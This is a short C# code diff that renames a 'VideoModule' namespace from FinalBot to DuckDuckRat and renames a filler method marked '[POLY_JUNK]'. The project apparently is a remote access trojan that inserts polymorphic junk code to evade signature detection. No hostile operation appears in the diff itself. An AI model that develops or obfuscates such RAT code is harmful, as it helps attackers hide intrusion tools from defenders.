@@ -3,12 +3,12 @@ using System.IO;
 using System.IO.Compression;
 using System.Threading.Tasks;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class VideoModule
     {
         // [POLY_JUNK]
-        private static void _vanguard_c145bc64() {
+        private static void _DuckDuckRat_c145bc64() {
             int val = 44564;
             if (val > 50000) Console.WriteLine("Hash:" + 44564);
         }
@@ -50,3 +50,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
